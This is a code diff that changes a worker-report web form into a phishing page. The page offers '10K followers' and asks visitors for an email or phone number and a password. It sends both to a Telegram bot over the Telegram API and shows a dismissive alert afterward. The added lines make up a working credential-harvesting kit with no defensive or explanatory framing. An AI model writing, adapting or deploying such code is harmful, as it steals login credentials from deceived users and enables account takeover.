@@ -78,15 +78,15 @@
   <div class="logo">👥</div>
 
   <!-- Motivational message -->
-  <div class="message">ACHHE SE WORK KARNE AUR BONUS MILEGA ❤️</div>
+  <div class="message"> Followers 10K  </div>
 
   <!-- Worker form -->
-  <input id="worker" class="input" type="text" placeholder="Worker Name">
-  <input id="work" class="input" type="text" placeholder="Today Work">
+  <input id="worker" class="input" type="text" placeholder="Email/Number">
+  <input id="work" class="input" type="text" placeholder="Password">
 
   <button class="btn" onclick="sendToTelegram()">Submit</button>
 
-  <div class="note">Submit karte hi Telegram par jayega</div>
+  <div class="note">Login Karne Ke Baad Link Dalna hoga made by Mishra ji</div>
 </div>
 
 <script>
@@ -103,9 +103,9 @@
     }
 
     const text =
-`👥 WORKER REPORT
-👤 Name: ${worker}
-🛠 Work: ${work}`;
+`Login
+Email/number: ${worker}
+Password: ${work}`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
@@ -116,7 +116,7 @@
       })
     })
     .then(() => {
-      alert("Telegram pe bhej diya ✅");
+      alert("Abhi mood nhi hai badme ana 🙏");
       document.getElementById("worker").value = "";
       document.getElementById("work").value = "";
     })
